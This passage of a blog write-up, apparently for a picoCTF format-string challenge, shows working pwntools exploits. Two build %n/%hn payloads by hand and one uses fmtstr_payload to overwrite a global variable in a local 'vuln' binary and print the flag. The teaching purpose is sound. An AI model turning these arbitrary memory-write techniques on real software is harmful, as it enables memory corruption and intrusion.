+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little  </span><br><span class="line">RELRO:      Partial RELRO    </span><br><span class="line">Stack:      No canary found  </span><br><span class="line">NX:         NX enabled       </span><br><span class="line">PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>Running checksec on the binary, we see that the binary does NOT have <code>PIE</code>. If you are not familiar with it, it stands for <code>Position Independent Executable</code>. It is a security measure that enables executables to be loaded at random memory addresses. When this is not enabled, we have the exact location of global variables, functions, and more within the binary.</p>
+<p>Something else you’ll want to be familiar with for this challenge is the <code>%n</code> format specifier. It is used to write to a memory address. Recall those pointers that we were printing off the stack inside the <code>Format String 1</code>. If we were to use <code>%n</code> it would dereference the pointer that is currently within reach (or provided as an argument) and from there would write x amount of bytes to it, x being the number of bytes printed beforehand by the current printf call. So if we did <code>AA%n</code> inside of printf, it would print two bytes to the pointer that is dereferenced.</p>
+<p>How does that help us write to <code>sus</code>? Well, if we can dereference the address of sus on the stack, then we can write to it. We can place that address of the stack by using it in our input like so:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?</span><br><span class="line">AAAAAAAA%14$p</span><br><span class="line">Here&#x27;s your input: AAAAAAAA0x4141414141414141</span><br></pre></td></tr></table></figure>
+
+<h1 id="Manual-Solve"><a href="#Manual-Solve" class="headerlink" title="Manual Solve"></a>Manual Solve</h1><p>Here we can see that our input starts at offset 14. So if we were to write the bytes that equal to the address of <code>sus</code> we can then do something like <code>%14$n</code> to write to it. Now in order to get the right value of bytes to write to the address we can use <code>%x</code> which when given a number in the middle like <code>%10x</code> will print 10 bytes.</p>
+<p>Here is the simplest script I have written to demonstrate:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&#x27;vuln&#x27;</span></span><br><span class="line">elf = context.binary = ELF(<span class="built_in">bin</span>)</span><br><span class="line">p = process(<span class="built_in">bin</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#address of sus to dereference</span></span><br><span class="line">sus = elf.sym[<span class="string">&#x27;sus&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;%000000008x%16$n&#x27;</span> + p64(sus)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Yielding:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?</span><br><span class="line">Here&#x27;s your input: 00402075`@@</span><br><span class="line">sus = 0x8</span><br><span class="line">You can do better!</span><br></pre></td></tr></table></figure>
+
+<p>So as you can see we have successfully change the value of <code>sus</code>. Now i’ll explain how the payload worked. The first 16 bytes we wrote will take up pointers 14 and 15 as each are 8 bytes, and then the 16th offset will be the address of sus. Using <code>%8x</code> we were able to write 8 bytes to it, the zero’s being used for padding. So now we can continue with our goal to write <code>0x67616c66</code> to sus. Now we need to write that many bytes, which is 1734437990. Now this would take a considerable amount of time to print, so what we can do is use multiple writes to do two writes instead of one. Breaking it up into <code>0x6761</code> and <code>0x6c66</code>.</p>
+<p>Here’s the script doing that:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&#x27;vuln&#x27;</span></span><br><span class="line">elf = context.binary = ELF(<span class="built_in">bin</span>)</span><br><span class="line">p = process(<span class="built_in">bin</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#address of sus to dereference</span></span><br><span class="line">sus = elf.sym[<span class="string">&#x27;sus&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;%26465x%18$nAAAA&#x27;</span> <span class="string">b&#x27;%1281x%19$hnAAAA&#x27;</span> + p64(sus+<span class="number">2</span>) + p64(sus) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Now to explain this one. When we write we cannot go backwards with how many bytes we have already written with printf (cannot decrease written bytes), therefor we need to write the smaller of the two first so we can write the larger next. So <code>0x6761</code> and <code>0x6c66</code> translate to <code>26465</code> and <code>27750</code> respectively. Doing some quick math <code>27750 - 26465 = 1285</code>. So if we write the first part, all we need to write after that is 1285 more bytes. Now you might be looking at my payload and wondering why I am writing <code>1281</code>. That is because of these padding bytes <code>AAAA</code> which take up 4 bytes, therefor reducing our number by 4.</p>
+<p>Another thing to note about the payload is I am writing the upper bytes first, so I am offseting the writing address by 2 bytes, making it write to the upper bytes slot. After than I am using specifier <code>%hn</code> to only write to bytes. You can find more information about specifics on format specifiers <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/binary-exploitation/format-strings">here</a>. This is useful because now instead of overwriting the other bytes we already wrote it will only effect the first two bytes at sus, which are the lower bytes we are missing.</p>
+<h1 id="Automated-Solve"><a href="#Automated-Solve" class="headerlink" title="Automated Solve"></a>Automated Solve</h1><p>Now that we have learned how to do it manually, I will show how easily pwntools can handle this exploit:</p>
+<p>Script:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">bin</span> = <span class="string">&#x27;vuln&#x27;</span></span><br><span class="line">elf = context.binary = ELF(<span class="built_in">bin</span>)</span><br><span class="line">p = process(<span class="built_in">bin</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#address of sus to dereference</span></span><br><span class="line">sus = elf.sym[<span class="string">&#x27;sus&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">14</span>, &#123;sus : <span class="number">0x67616c66</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Running the solve:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I have NO clue how you did that, you must be a wizard. Here you go...</span><br><span class="line">picoCTF&#123;f0rm47_57r?_f0rm47_m3m_99fd82cd&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-0"><span class="toc-number">1.</span> <span class="toc-text">Format String 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-1"><span class="toc-number">2.</span> <span class="toc-text">Format String 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-2"><span class="toc-number">3.</span> <span class="toc-text">Format String 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Manual-Solve"><span class="toc-number"></span> <span class="toc-text">Manual Solve</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Automated-Solve"><span class="toc-number"></span> <span class="toc-text">Automated Solve</span></a>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://anthony-js.info/blog/format-string/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://anthony-js.info/blog/format-string/&text=Format Strings"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://anthony-js.info/blog/format-string/&is_video=false&description=Format Strings"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Format Strings&body=Check out this article: http://anthony-js.info/blog/format-string/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://anthony-js.info/blog/format-string/&name=Format Strings&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://anthony-js.info/blog/format-string/&t=Format Strings"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2024
+    anthonyjs
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
